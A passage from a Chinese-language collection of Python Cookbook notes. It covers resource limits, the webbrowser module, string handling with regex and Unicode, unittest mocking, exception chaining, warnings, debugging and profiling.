while True: pass 程序运行时，SIGXCPU 信号在时间过期时被生成，然后执行清理并退出。 要限制内存使用，设置可使用的总内存值即可，如下: import resource def limit_memory(maxsize): soft, hard = resource.getrlimit(resource.RLIMIT_AS) resource.setrlimit(resource.RLIMIT_AS, (maxsize, hard)) 像这样设置了内存限制后，程序运行到没有多余内存时会抛出 MemoryError 异常。 讨论 在本节例子中，setrlimit() 函数被用来设置特定资源上面的软限制和硬限制。 软限制 是一个值，当超过这个值的时候操作系统通常会发送一个信号来限制或通知该进 程。 硬限制 是用来指定软限制能设定的最大值。通常来讲，这个由系统管理员通过设置 系统级参数来决定。尽管硬限制可以改小一点，但是最好不要使用用户进程去修改。 setrlimit() 函数还能被用来设置子进程数量、打开文件数以及类似系统资源的 限制。更多详情请参考 resource 模块的文档。 需要注意的是本节内容只能适用于 Unix 系统，并且不保证所有系统都能如期工 作。比如我们在测试的时候，它能在 Linux 上面正常运行，但是在 OS X 上却不能。 启动一个 WEB 浏览器 问题 你想通过脚本启动浏览器并打开指定的 URL 网页 解决方案 webbrowser 模块能被用来启动一个浏览器，并且与平台无关。例如: >>> import webbrowser >>> webbrowser.open('http://www.python.org') True >>> 它会使用默认浏览器打开指定网页。如果你还想对网页打开方式做更多控制，还可 以使用下面这些函数: >>> # Open the page in a new browser window >>> webbrowser.open_new('http://www.python.org') True >>> >>> # Open the page in a new browser tab >>> webbrowser.open_new_tab('http://www.python.org') True >>> 这样就可以打开一个新的浏览器窗口或者标签，只要浏览器支持就行。 如果你想指定浏览器类型，可以使用 webbrowser.get() 函数来指定某个特定浏览 器。例如: >>> c = webbrowser.get('firefox') >>> c.open('http://www.python.org') True >>> c.open_new_tab('http://docs.python.org') True >>> 对于支持的浏览器名称列表可查阅 Python 文档 讨论 在脚本中打开浏览器有时候会很有用。例如，某个脚本执行某个服务器发布任务， 你想快速打开一个浏览器来确保它已经正常运行了。或者是某个程序以 HTML 网页格 式输出数据，你想打开浏览器查看结果。不管是上面哪种情况，使用 webbrowser 模块 都是一个简单实用的解决方案。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-Script-programming-and-system-management.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Script-programming-and-system-management.html"},{"title":"字符串操作","text":"分隔字符串为列表 str.split re.split , 见 /docs/后端/python/python标准库/re split 用于 简单的字符串分割情形，它并不允许有 多个分隔符或者是分隔符周围不确定的空格。 当你需要更加灵活的切割字符串的时候， 最好使用 re.split() 方法: >>> line = 'asdf fjdk; afed, fjek,asdf, foo' >>> import re >>> re.split(r'[;,\\s]\\s*', line) ['asdf', 'fjdk', 'afed', 'fjek', 'asdf', 'foo'] 当你使用 re.split() 函数时候， 需要特别注意的是正则表达式中是否包含一个括 号捕获分组。 如果使用了捕获分组，那么被匹配的文本也将出现在结果列表中: >>> fields = re.split(r'(;|,|\\s)\\s*', line) >>> fields ['asdf', ' ', 'fjdk', ';', 'afed', ',', 'fjek', ',', 'asdf', ',', 'foo'] >>> 如果你不想保留分割字符串到结果列表中去，但仍然需要使用到括号来分组正则 表达式的话， 确保你的分组是非捕获分组，形如 (?:...) >>> re.split(r'(?:,|;|\\s)\\s*', line) ['asdf', 'fjdk', 'afed', 'fjek', 'asdf', 'foo'] >>> 字符串首尾匹配 str.startswith str. endswith 切片 re.match, 见 /docs/后端/python/python标准库/re fnmatch.fnmatch, 见 /docs/后端/python/python标准库/fnmatch fnmatch.fnmatchcase 字符串搜索/匹配 str.find str.endswith str.startswith re.match re.findall re.finditer 定义正则式的时候，通常会利用括号去捕获分组 使用match: >>> datepat = re.compile(r'(\\d+)/(\\d+)/(\\d+)') >>> m = datepat.match('11/27/2012') >>> m <_sre.SRE_Match object at 0x1005d2750> >>> # Extract the contents of each group >>> m.group(0) '11/27/2012' >>> m.group(1) '11' >>> m.group(2) '27' >>> m.group(3) '2012' >>> m.groups() ('11', '27', '2012') 使用 findall: >>> text 'Today is 11/27/2012. PyCon starts 3/13/2013.' >>> datepat.findall(text) [('11', '27', '2012'), ('3', '13', '2013')] >>> for month, day, year in datepat.findall(text): ... print('{}-{}-{}'.format(year, month, day)) ... 2012-11-27 2013-3-13 >>> 使用 finditer 获取迭代. 字符串替换/搜索 str.replace re.sub, 见 /docs/后端/python/python标准库/re sub: >>> text = 'Today is 11/27/2012. PyCon starts 3/13/2013.' >>> import re >>> re.sub(r'(\\d+)/(\\d+)/(\\d+)', r'\\3-\\1-\\2', text) 'Today is 2012-11-27. PyCon starts 2013-3-13.' >>> 忽略大小写 re.IGNORECASE re.IGNORECASE >>> text = 'UPPER PYTHON, lower python, Mixed Python' >>> re.findall('python', text, flags=re.IGNORECASE) ['PYTHON', 'python', 'Python'] >>> re.sub('python', 'snake', text, flags=re.IGNORECASE) 'UPPER snake, lower snake, Mixed snake' >>> 最短匹配模式 这个问题一般出现在需要匹配一对分隔符之间的文本的时候 (比如引号包含的字符 串), 原因是 在正 则表达式中 * 操作符是贪婪的，因此匹配操作会查找最长的可能匹配 >>> str_pat = re.compile(r'\\\"(.*)\\\"') >>> text1 = 'Computer says \"no.\"' >>> str_pat.findall(text1) ['no.'] >>> text2 = 'Computer says \"no.\" Phone says \"yes.\"' >>> str_pat.findall(text2) ['no.\" Phone says \"yes.'] >>> 为了修正这个问题，可以在模式中的 * 操作符后面加上? 修饰符: >>> str_pat = re.compile(r'\\\"(.*?)\\\"') >>> str_pat.findall(text2) ['no.', 'yes.'] >>> 使得匹配变成非贪婪模式，从而得到最短的匹配 在一 个模式字符串中，点 (.) 匹配除了换行外的任何字符。 然而，如果你将点 (.) 号放在开始 与结束符 (比如引号) 之间的时候，那么匹配操作会查找符合模式的最长可能匹配。 这 样通常会导致很多中间的被开始与结束符包含的文本被忽略掉，并最终被包含在匹配 结果字符串中返回。 通过在 * 或者 + 这样的操作符后面添加一个 ? 可以强制匹配算法 改成寻找最短的可能匹配。 多行匹配 点 (.) 匹配除了换行外的任何字符 可以修改模式字符串，增加对换行的支持: >>> text1 = '/* this is a comment */' >>> text2 = '''/* this is a ... multiline comment */ ... ''' >>> comment.findall(text1) [' this is a comment '] >>> comment.findall(text2) [] >>> >>> comment = re.compile(r'/\\*((?:.|\\n)*?)\\*/') >>> comment.findall(text2) [' this is a\\n multiline comment '] >>> (?:.|n) 指定了一个非捕获组 (也就是它定义了一个仅仅用来做 匹配，而不能通过单独捕获或者编号的组)。 re.compile() 函数接受一个标志参数叫 re.DOTALL ，可以让 正则表达式中的点 (.) 匹配包括换行符在内的任意字符 Unicode 文本标准化 在 Unicode 中，某些字符能够用多个合法的编码表示: >>> s1 = 'Spicy Jalape\\u00f1o' >>> s2 = 'Spicy Jalapen\\u0303o' >>> s1 'Spicy Jalapeño' >>> s2 'Spicy Jalapeño' >>> s1 == s2 False >>> len(s1) 14 >>> len(s2) 15 >>> 文本\"Spicy Jalapeño\"使用了两种形式来表示。 第一种使用整体字符\"ñ\" (U+00F1)， 第二种使用拉丁字母\"n\"后面跟一个\"~\"的组合字符 (U+0303)。 在需要比较字符串的程序中使用字符的多种表示会产生问题。为了修正这个问题， 你可以使用 unicodedata 模块先将文本标准化: >>> import unicodedata >>> t1 = unicodedata.normalize('NFC', s1) >>> t2 = unicodedata.normalize('NFC', s2) >>> t1 == t2 True >>> print(ascii(t1)) 'Spicy Jalape\\xf1o' >>> t3 = unicodedata.normalize('NFD', s1) >>> t4 = unicodedata.normalize('NFD', s2) >>> t3 == t4 True >>> print(ascii(t3)) 'Spicy Jalapen\\u0303o' >>> NFC 表示字符应该是整体组 成 (比如可能的话就使用单一编码) NFD 表示字符应该分解为多个组合字符表示 同样支持扩展的标准化形式 NFKC 和 NFKD，它们在处理某些字符的时 候增加了额外的兼容特性。比如: >>> s = '\\ufb01' # A single character >>> s '' >>> unicodedata.normalize('NFD', s) '' # Notice how the combined letters are broken apart here >>> unicodedata.normalize('NFKD', s) 'fi' >>> unicodedata.normalize('NFKC', s) 'fi' >>> 标准化对于任何需要以一致的方式处理 Unicode 文本的程序都是非常重要的 , 当 处理来自用户输入的字符串而你很难去控制编码的时候尤其如此。 在清理和过滤文本的时候字符的标准化也是很重要的。 比如，假设你想清除掉一些 文本上面的变音符的时候 (可能是为了搜索和匹配): >>> t1 = unicodedata.normalize('NFD', s1) >>> ''.join(c for c in t1 if not unicodedata.combining(c)) 'Spicy Jalapeno' >>> combining() 函数可以测试一个字符是否为和音字符 和音字符, 不知道为什书上这么定义, 实际就是是否为规范的数字字符: 为规范数字字符返回数字 否则返回0 正则使用 Unicode 用于 使用正则表达式处理文本，但是关注的是 Unicode 字符处理 默认情况下 re 模块已经对一些 Unicode 字符类有了基本的支持。 比如， \\\\d 可表示匹配任意的 unicode 数字字符: >>> import re >>> num = re.compile('\\d+') >>> # ASCII digits >>> num.match('123') <_sre.SRE_Match object at 0x1007d9ed0> >>> # Arabic digits >>> num.match('\\u0661\\u0662\\u0663') <_sre.SRE_Match object at 0x101234030> >>> 匹配几个不同阿拉伯编码页 面中所有字符: >>> arabic = re.compile('[\\u0600-\\u06ff\\u0750-\\u077f\\u08a0-\\u08ff]+') >>> 当执行匹配和搜索操作的时候，最好是先标准化并且清理所有文本为标准化格式. 但是同样也应该注意一些特殊情况，比如在忽略大小写匹配和大小写 转换时的行为: >>> pat = re.compile('stra\\u00dfe', re.IGNORECASE) >>> s = 'straße' >>> pat.match(s) # Matches <_sre.SRE_Match object at 0x10069d370> >>> pat.match(s.upper()) # Doesn't match >>> s.upper() # Case folds 'STRASSE' >>> 混合使用 Unicode 和正则表达式通常会让你抓狂。 如果你真的打算这样做的话，最 好考虑下安装第三方正则式库， 它们会为 Unicode 的大小写转换和其他大量有趣特性 提供全面的支持，包括模糊匹配。 删除字符串中字符 去掉文本字符串开头，结尾或者中间不想要的字符，比如空白 str.strip 删除开始或结尾的字符 str.lstrip 从左执行删除 str.rstrip 从右执行删除 str.replace 字符串替换 re.sub 字符串正则替换 清理文本字符串 除了上面的, 还有 str.translate 自定义替换 例如: >>> s = 'pýtĥöñ\\fis\\tawesome\\r\\n' >>> s 'pýtĥöñ\\x0cis\\tawesome\\r\\n' >>> 第一步是清理空白字符, 空白字符 \\t 和 \\f 已经被重新映射到一个空格。 回车字符 \\r 直 接被删除。: >>> remap = { ... ord('\\t') : ' ', ... ord('\\f') : ' ', ... ord('\\r') : None # Deleted ... } >>> a = s.translate(remap) >>> a 'pýtĥöñ is awesome\\n' >>> 使用 dict.fromkeys() 方法构造一个字典，每个 Unicode 和音 符作为键，对应的值全部为 None 。 然后使用 unicodedata.normalize() 将原始输入标准化为分解形式字符。 然后再 调用 translate 函数删除所有重音符: >>> import unicodedata >>> import sys >>> cmb_chrs = dict.fromkeys(c for c in range(sys.maxunicode) ... if unicodedata.combining(chr(c))) ... >>> b = unicodedata.normalize('NFD', a) >>> b 'pýtĥöñ is awesome\\n' >>> b.translate(cmb_chrs) 'python is awesome\\n' >>> 同样的技术也可以被用来删除其他类型的字符 (比如控制字符等)。 另一种清理文本的技术涉及到 I/O 解码与编码函数。 这里的思路是先对文本做一 些初步的清理，然后再结合 encode() 或者 decode() 操作来清除或修改它: >>> a 'pýtĥöñ is awesome\\n' >>> b = unicodedata.normalize('NFD', a) >>> b.encode('ascii', 'ignore').decode('ascii') 'python is awesome\\n' >>> 这里的标准化操作将原来的文本分解为单独的和音符。 接下来的 ASCII 编码/解码 只是简单的一下子丢弃掉那些字符。 当然，这种方法仅仅只在最后的目标就是获取到文 本对应 ACSII 表示的时候生效。 文本字符清理一个最主要的问题应该是运行的性能。 一般来讲，代码越简单运行越 快。 对于简单的替换操作，str.replace() 方法通常是最快的，甚至在你需要多次调用 的时候. 另一方面，如果你需要执行任何复杂字符对字符的重新映射或者删除操作的话， tanslate() 方法会非常的快。 字符串对齐 通过某种对齐方式来格式化字符串 str.ljust str.rjust str.center format 例: >>> text = 'Hello World' >>> text.ljust(20) 'Hello World ' >>> text.rjust(20) ' Hello World' >>> text.center(20) ' Hello World ' >>> 所有这些方法都能接受一个可选的填充字符: >>> text.rjust(20,'=') '=========Hello World' >>> text.center(20,'*') '****Hello World*****' >>> 函数 format() 同样可以用来很容易的对齐字符串。你要做的就是使用 <,> 或者 &#94; 字符后面紧跟一个指定的宽度: >>> format(text, '>20') ' Hello World' >>> format(text, '<20') 'Hello World ' >>> format(text, '&#94;20') ' Hello World ' >>> 如果你想指定一个非空格的填充字符，将它写到对齐字符的前面即可: >>> format(text, '=>20s') '=========Hello World' >>> format(text, '*&#94;20s') '****Hello World*****' >>> 当格式化多个值的时候，这些格式代码也可以被用在 format() 方法中: >>> '{:>10s} {:>10s}'.format('Hello', 'World') ' Hello World' >>> format() 函数的一个好处是它不仅适用于字符串。它可以用来格式化任何值，使 得它非常的通用。比如，你可以用它来格式化数字: >>> x = 1.2345 >>> format(x, '>10') ' 1.2345' >>> format(x, '&#94;10.2f') ' 1.23 ' >>> 在老的代码中，你经常会看到被用来格式化文本的 % 操作符。比如: >>> '%-20s' % text 'Hello World ' >>> '%20s' % text ' Hello World' >>> 但是，在新版本代码中，你应该优先选择 format() 函数或者方法。 format() 要比 % 操作符的功能更为强大。 并且 format() 也比使用 ljust() , rjust() 或 center() 方 法更通用，因为它可以用来格式化任意对象，而不仅仅是字符串 合并/拼接字符串 将几个小的字符串合并为一个大的字符 ''.join(iter) str1 + str2 只是合并少数几个字符串，使用加号 (+) 通常已经足够了: >>> a = 'Is Chicago' >>> b = 'Not Chicago?' >>> a + ' ' + b 'Is Chicago Not Chicago?' >>> 在源码中将两个字面字符串合并: >>> a = 'Hello' 'World' >>> a 'HelloWorld' >>> 使用加号 (+) 操作符去连接大量的字符串的 时候是非常低效率的，因为加号连接会引起内存复制以及垃圾回收操作 注意别使用没必要的字符串连接: print(a + ':' + b + ':' + c) # Ugly print(':'.join([a, b, c])) # Still ugly print(a, b, c, sep=':') # Better 当混合使用 I/O 操作和字符串连接操作的时候，有时候需要仔细研究你的程序。比 如: # Version 1 (string concatenation) f.write(chunk1 + chunk2) # Version 2 (separate I/O operations) f.write(chunk1) f.write(chunk2) 如果两个字符串很小，那么第一个版本性能会更好些，因为 I/O 系统调用天生就 慢。 另外一方面，如果两个字符串很大，那么第二个版本可能会更加高效，因为它避免 了创建一个很大的临时结果并且要复制大量的内存块数据。 编写构建大量小字符串的输出代码，你最好考虑下使用生 成器函数，利用 yield 语句产生输出片段: def sample(): yield 'Is' yield 'Chicago' yield 'Not' yield 'Chicago?' 支持直接join: text = ''.join(sample()) 字符串中插入变量 format 使用 format: >>> s = '{name} has {n} messages.' >>> s.format(name='Guido', n=37) 'Guido has 37 messages.' >>> 如果要被替换的变量能在变量域中找到，那么你可以结合使用 format_map() 和 vars() >>> name = 'Guido' >>> n = 37 >>> s.format_map(vars()) 'Guido has 37 messages.' >>> 也适用于对象实例: >>> class Info: ... def __init__(self, name, n): ... self.name = name ... self.n = n >>> a = Info('Guido',37) >>> s.format_map(vars(a)) 'Guido has 37 messages.' >>> format 和 format_map() 的一个缺陷就是它们并不能很好的处理变量缺失的情况: >>> s.format(name='Guido') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> KeyError: 'n' >>> 一种避免这种错误的方法是另外定义一个含有 __missing__() 方法的字典对象: class safesub(dict): \"\"\" 防止 key 找不到\"\"\" def __missing__(self, key): return '{' + key + '}' >>> del n # Make sure n is undefined >>> s.format_map(safesub(vars())) 'Guido has {n} messages.' >>> 其他方式: % >>> name = 'Guido' >>> n = 37 >>> '%(name) has %(n) messages.' % vars() 'Guido has 37 messages.' >>> 字符串模版: >>> import string >>> s = string.Template('$name has $n messages.') >>> s.substitute(vars()) 'Guido has 37 messages.' >>> format() 和 format_map() 相比较上面这些方案而已更加先进，因此应该 被优先选择。 使用 format() 方法还有一个好处就是你可以获得对字符串格式化的所有 支持 (对齐，填充，数字格式化等待)， 而这些特性是使用像模板字符串之类的方案不可 能获得的。 指定列宽格式化 有一些长字符串，想以指定的列宽将它们重新格式化 /docs/后端/python/python标准库/textwrap 使用 textwrap s = \"Look into my eyes, look into my eyes, the eyes, the eyes, \\ the eyes, not around the eyes, don't look around the eyes, \\ look into my eyes, you're under.\" 格式化: >>> import textwrap >>> print(textwrap.fill(s, 70)) # 每行最长 70 >>> print(textwrap.fill(s, 40)) # 每行最长 40 >>> print(textwrap.fill(s, 40, initial_indent=' ')) textwrap 模块对于字符串打印是非常有用的，特别是当你希望输出自动匹配终端 大小的时候。 你可以使用 os.get_terminal_size() 方法来获取终端的大小尺寸。比如: >>> import os >>> os.get_terminal_size().columns 80 >>> fill() 方法接受一些其他可选参数来控制 tab，语句结尾等。参阅 /docs/后端/python/python标准库/textwrap 处理 html 和 xml 将 HTML 或者 XML 实体如 &entity; 或 &#code; 替换为对应的文本。再者， 你需要转换文本中特定的字符 (比如 <, >, 或 &) 可以使用 /docs/后端/python/python标准库/html 在生成 HTML 或者 XML 文本的时候，如果正确的转换特殊标记字符是一个很容 易被忽视的细节。 特别是当你使用 print() 函数或者其他字符串格式化来产生输出的 时候。 使用像 html.escape() 的工具函数可以很容易的解决这类问题。 如果你想以其他方式处理文本，还有一些其他的工具函数比如 xml.sax.saxutils. unescapge() 可以帮助你。 然而，你应该先调研清楚怎样使用一个合适的解析器。 比 如，如果你在处理 HTML 或 XML 文本， 使用某个解析模块比如 html.parse 或 xml. etree.ElementTree 已经帮你自动处理了相关的替换细节。 字符串令牌解析 假如你有下面这样一个文本字符串: text = 'foo = 23 + 42 * 10' 为了令牌化字符串，你不仅需要匹配模式，还得指定模式的类型. 例: tokens = [('NAME', 'foo'), ('EQ','='), ('NUM', '23'), ('PLUS','+'), ('NUM', '42'), ('TIMES', '*'), ('NUM', '10')] 利用命名捕获组的正则表达式来定 义所有可能的令牌，包括空格: import re NAME = r'(?P<NAME>[a-zA-Z_][a-zA-Z_0-9]*)' NUM = r'(?P<NUM>\\d+)' PLUS = r'(?P<PLUS>\\+)' TIMES = r'(?P<TIMES>\\*)' EQ = r'(?P<EQ>=)' WS = r'(?P<WS>\\s+)' master_pat = re.compile('|'.join([NAME, NUM, PLUS, TIMES, EQ, WS])) ?P<TOKENNAME> 用于给一个模式命名，供后面使用 使用 scanner() >>> scanner = master_pat.scanner('foo = 42') >>> scanner.match() <_sre.SRE_Match object at 0x100677738> >>> _.lastgroup, _.group() ('NAME', 'foo')","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-cookbook-String-operation.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-String-operation.html"},{"title":"测试、调试和异常","text":"试验还是很棒的，但是调试？就没那么有趣了。事实是，在 Python 测试代码之前 没有编译器来分析你的代码，因此使的测试成为开发的一个重要部分。本章的目标是讨 论一些关于测试、调试和异常处理的常见问题。但是并不是为测试驱动开发或者单元测 试模块做一个简要的介绍。因此，笔者假定读者熟悉测试概念。 测试 stdout 输出 问题 你的程序中有个方法会输出到标准输出中（sys.stdout）。也就是说它会将文本打印 到屏幕上面。你想写个测试来证明它，给定一个输入，相应的输出能正常显示出来。 解决方案 使用 unittest.mock 模块中的 patch() 函数，使用起来非常简单，可以为单个测 试模拟 sys.stdout 然后回滚，并且不产生大量的临时变量或在测试用例直接暴露状态 变量。 作为一个例子，我们在 mymodule 模块中定义如下一个函数: # mymodule.py def urlprint(protocol, host, domain): url = '{}://{}.{}'.format(protocol, host, domain) print(url) 使用unitetest相关工具测试: from io import StringIO from unittest import TestCase from unittest.mock import patch import mymodule class TestURLPrint(TestCase): def test_url_gets_to_stdout(self): protocol = 'http' host = 'www' domain = 'example.com' expected_url = '{}://{}.{}\\n'.format(protocol, host, domain) with patch('sys.stdout', new=StringIO()) as fake_out: mymodule.urlprint(protocol, host, domain) self.assertEqual(fake_out.getvalue(), expected_url) 讨论 urlprint() 函数接受三个参数，测试方法开始会先设置每一个参数的值。 expected_url 变量被设置成包含期望的输出的字符串。 unittest.mock.patch() 函数被用作一个上下文管理器，使用 StringIO 对象来代 替 sys.stdout . fake_out 变量是在该进程中被创建的模拟对象。在 with 语句中使用 它可以执行各种检查。当 with 语句结束时，patch 会将所有东西恢复到测试开始前的 状态。有一点需要注意的是某些对 Python 的 C 扩展可能会忽略掉 sys.stdout 的配 置二直接写入到标准输出中。限于篇幅，本节不会涉及到这方面的讲解，它适用于纯 Python 代码。如果你真的需要在 C 扩展中捕获 I/O，你可以先打开一个临时文件，然 后将标准输出重定向到该文件中。 在单元测试中给对象打补丁 问题 你写的单元测试中需要给指定的对象打补丁，用来断言它们在测试中的期望行为 （比如，断言被调用时的参数个数，访问指定的属性等）。 解决方案 unittest.mock.patch() 函数可被用来解决这个问题。patch() 还可被用作一个 装饰器、上下文管理器或单独使用，尽管并不常见。例如，下面是一个将它当做装饰器 使用的例子: from unittest.mock import patch import example @patch('example.func') def test1(x, mock_func): example.func(x) # Uses patched example.func mock_func.assert_called_with(x) 它还可以被当做一个上下文管理器: with patch('example.func') as mock_func: example.func(x) # Uses patched example.func mock_func.assert_called_with(x) 最后，你还可以手动的使用它打补丁: p = patch('example.func') mock_func = p.start() example.func(x) mock_func.assert_called_with(x) p.stop() 如果可能的话，你能够叠加装饰器和上下文管理器来给多个对象打补丁 讨论 patch() 接受一个已存在对象的全路径名，将其替换为一个新的值。原来的值会在 装饰器函数或上下文管理器完成后自动恢复回来。默认情况下，所有值会被 MagicMock 实例替代。例如: >>> x = 42 >>> with patch('__main__.x'): ... print(x) ... <MagicMock name='x' id='4314230032'> >>> x 42 >>> 不过，你可以通过给 patch() 提供第二个参数来将值替换成任何你想要的: >>> x 42 >>> with patch('__main__.x', 'patched_value'): ... print(x) ... patched_value >>> x 42 >>> 被用来作为替换值的 MagicMock 实例能够模拟可调用对象和实例。他们记录对象 的使用信息并允许你执行断言检查， 在单元测试中测试异常情况 问题 你想写个测试用例来准确的判断某个异常是否被抛出。 解决方案 对于异常的测试可使用 assertRaises() 方法。 讨论 assertRaises() 方法为测试异常存在性提供了一个简便方法。一个常见的陷阱是 手动去进行异常检测。 比如: class TestConversion(unittest.TestCase): def test_bad_int(self): try: r = parse_int('N/A') except ValueError as e: self.assertEqual(type(e), ValueError) 这种方法的问题在于它很容易遗漏其他情况，比如没有任何异常抛出的时候。那么 你还得需要增加另外的检测过程，如下面这样: class TestConversion(unittest.TestCase): def test_bad_int(self): try: r = parse_int('N/A') except ValueError as e: self.assertEqual(type(e), ValueError) else: self.fail('ValueError not raised') assertRaises() 方法会处理所有细节，因此你应该使用它。 assertRaises() 的一个缺点是它测不了异常具体的值是多少。为了测试异常值， 可以使用 assertRaisesRegex() 方法，它可同时测试异常的存在以及通过正则式匹配 异常的字符串表示。 assertRaises() 和 assertRaisesRegex() 还有一个容易忽略的地方就是它们还 能被当做上下文管理器使用: class TestConversion(unittest.TestCase): def test_bad_int(self): with self.assertRaisesRegex(ValueError, 'invalid literal .*'): r = parse_int('N/A') 将测试输出用日志记录到文件中 问题 你希望将单元测试的输出写到到某个文件中去，而不是打印到标准输出。 解决方案 运行单元测试一个常见技术就是在测试文件底部加入下面这段代码片段: import unittest class MyTest(unittest.TestCase): pass if __name__ == '__main__': unittest.main() 这样的话测试文件就是可执行的，并且会将运行测试的结果打印到标准输出上。如 果你想重定向输出，就需要像下面这样修改 main() 函数: import sys def main(out=sys.stderr, verbosity=2): loader = unittest.TestLoader() suite = loader.loadTestsFromModule(sys.modules[__name__]) unittest.TextTestRunner(out,verbosity=verbosity).run(suite) if __name__ == '__main__': with open('testing.out', 'w') as f: main(f) 讨论 本节感兴趣的部分并不是将测试结果重定向到一个文件中，而是通过这样做向你 展示了 unittest 模块中一些值得关注的内部工作原理。 忽略或期望测试失败 处理多个异常 捕获所有异常 想要捕获所有的异常，可以直接捕获 Exception 将会捕获除了 SystemExit 、KeyboardInterrupt 和 GeneratorExit 之外的 所有异常。如果你还想捕获这三个异常，将 Exception 改成 BaseException 即可 应该尽可能将异常处理器定义的精准一些。 创建自定义异常 自定义异常类应该总是继承自内置的 Exception 类，或者是继承自那些本身就是 从 Exception 继承而来的类。 捕获异常后抛出另外的异常 问题 你想捕获一个异常后抛出另外一个不同的异常，同时还得在异常回溯中保留两个 异常的信息。 解决方案 为了链接异常，使用 raise from 语句来代替简单的 raise 语句。它会让你同时保 留两个异常的信息。例如: >>> def example(): ... try: ... int('N/A') ... except ValueError as e: ... raise RuntimeError('A parsing error occurred') from e ... >>> example() Traceback (most recent call last): File \"<stdin>\", line 3, in example ValueError: invalid literal for int() with base 10: 'N/A' Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"<stdin>\", line 5, in example RuntimeError: A parsing error occurred >>> 如果，你想忽略掉异常链，可使用 raise from None 讨论 在设计代码时，在另外一个 except 代码块中使用 raise 语句的时候你要特别小心 了。大多数情况下，这种 raise 语句都应该被改成 raise from 语句。也就是说你应该 使用下面这种形式: try: ... except SomeException as e: raise DifferentException() from e 这样做的原因是你应该显示的将原因链接起来。也就是说，DifferentException 是直接从 SomeException 衍生而来。这种关系可以从回溯结果中看出来。 重新抛出被捕获的异常 简单的使用一个单独的 rasie 语句即可 输出警告信息 使用 warning.warn() 函数 warn() 的参数是一个警告消息和一个警告类，警告类有如下几种： UserWarning DeprecationWarning SyntaxWarning RuntimeWarning ResourceWarning FutureWarning. 对警告的处理取决于你如何运行解释器以及一些其他配置。例如，如果你使用 -W all 选项去运行 Python，你会得到如下的输出: bash % python3 -W all example.py example.py:5: DeprecationWarning: logfile argument is deprecated warnings.warn('logfile argument is deprecated', DeprecationWarning) 通常来讲，警告会输出到标准错误上。如果你想讲警告转换为异常，可以使用 -W error 选项: bash % python3 -W error example.py Traceback (most recent call last): File \"example.py\", line 10, in <module> func(2, 3, logfile='log.txt') File \"example.py\", line 5, in func warnings.warn('logfile argument is deprecated', DeprecationWarning) DeprecationWarning: logfile argument is deprecated bash % 默认情况下，并不是所有警告消息都会出现. -W 选项能控制警告消息的输出. -W all 会输出所有警告消息 -W ignore 忽略掉所有警告 -W error 将警告转换成异常 另外一种选择，你还可以使用 warnings.simplefilter() 函数控制输出: always 参数会让所有警告消息出现 ignore 忽略调所有的警告 error 将警告转换成异常。 调试基本的程序崩溃错误 使用: python3 -i sample.py 在执行结束时打开交互式窗口查看环境 也可以在程序崩溃后打开 Python 的调试器。例如: >>> import pdb >>> pdb.pm() > sample.py(4)func() -> return n + 10 (Pdb) w sample.py(6)<module>() -> func('Hello') > sample.py(4)func() -> return n + 10 (Pdb) print n 'Hello' (Pdb) q >>> 如果你的代码所在的环境很难获取交互 shell（比如在某个服务器上面），通常可以 捕获异常后自己打印跟踪信息。例如: import traceback import sys try: func(arg) except: print('**** AN ERROR OCCURRED ****') traceback.print_exc(file=sys.stderr) 要是你的程序没有崩溃，而只是产生了一些你看不懂的结果，你在感兴趣的地方插 入一下 print() 语句也是个不错的选择。不过，要是你打算这样做，有一些小技巧可 以帮助你。首先，traceback.print_stack() 函数会你程序运行到那个点的时候创建 一个跟踪栈。 可使用 pdb.set_trace() 在任何地方手动的启动调试器 给你的程序做性能测试 问题 ·你想测试你的程序运行所花费的时间并做性能测试。 解决方案 如果你只是简单的想测试下你的程序整体花费的时间，通常使用 Unix 时间函数time就 行了: bash % time python3 someprogram.py real 0m13.937s user 0m12.162s sys 0m0.098s bash % 如果你还需要一个程序各个细节的详细报告，可以使用 cProfile 模块: bash % python3 -m cProfile someprogram.py 859647 function calls in 16.016 CPU seconds Ordered by: standard name ncalls tottime percall cumtime percall filename:lineno(function) 263169 0.080 0.000 0.080 0.000 someprogram.py:16(frange) 513 0.001 0.000 0.002 0.000 someprogram.py:30(generate_ , →mandel) 262656 0.194 0.000 15.295 0.000 someprogram.py:32(<genexpr>) 1 0.036 0.036 16.077 16.077 someprogram.py:4(<module>) 262144 15.021 0.000 15.021 0.000 someprogram.py:4(in_mandelbrot) 1 0.000 0.000 0.000 0.000 os.py:746(urandom) 1 0.000 0.000 0.000 0.000 png.py:1056(_readable) 1 0.000 0.000 0.000 0.000 png.py:1073(Reader) 1 0.227 0.227 0.438 0.438 png.py:163(<module>) 512 0.010 0.000 0.010 0.000 png.py:200(group) ... bash % 不过通常情况是介于这两个极端之间。比如你已经知道代码运行时在少数几个函 数中花费了绝大部分时间。对于这些函数的性能测试，可以使用一个简单的装饰器: start = time.perf_counter() r = func(*args, **kwargs) end = time.perf_counter() 对于测试很小的代码片段运行性能，使用 timeit 模块会很方便，例如: >>> from timeit import timeit >>> timeit('math.sqrt(2)', 'import math') 0.1432319980012835 >>> timeit('sqrt(2)', 'from math import sqrt') 0.10836604500218527 >>> timeit 会执行第一个参数中语句 100 万次并计算运行时间。第二个参数是运行测 试之前配置环境。如果你想改变循环执行次数，可以像下面这样设置 number 参数的值: >>> timeit('math.sqrt(2)', 'import math', number=10000000) 1.434852126003534 >>> timeit('sqrt(2)', 'from math import sqrt', number=10000000) 1.0270336690009572 >>> 讨论 当执行性能测试的时候，需要注意的是你获取的结果都是近似值。time. perf_counter() 函数会在给定平台上获取最高精度的计时值。不过，它仍然还是 基于时钟时间，很多因素会影响到它的精确度，比如机器负载。如果你对于执行时间更 感兴趣，使用 time.process_time() 来代替它。 最后，如果你想进行更深入的性能分析，那么你需要详细阅读 time 、timeit 和其 他相关模块的文档。这样你可以理解和平台相关的差异以及一些其他陷阱。 加速程序运行 问题 你的程序运行太慢，你想在不使用复杂技术比如 C 扩展或 JIT 编译器的情况下加 快程序运行速度。 解决方案 关于程序优化的第一个准则是\"不要优化\"，第二个准则是\"不要优化那些无关紧 要的部分\"。如果你的程序运行缓慢，首先你得使用上一节的技术先对它进行性能 测试找到问题所在。 通常来讲你会发现你得程序在少数几个热点地方花费了大量时间，比如内存的数 据处理循环。一旦你定位到这些点，你就可以使用下面这些实用技术来加速程序运行: 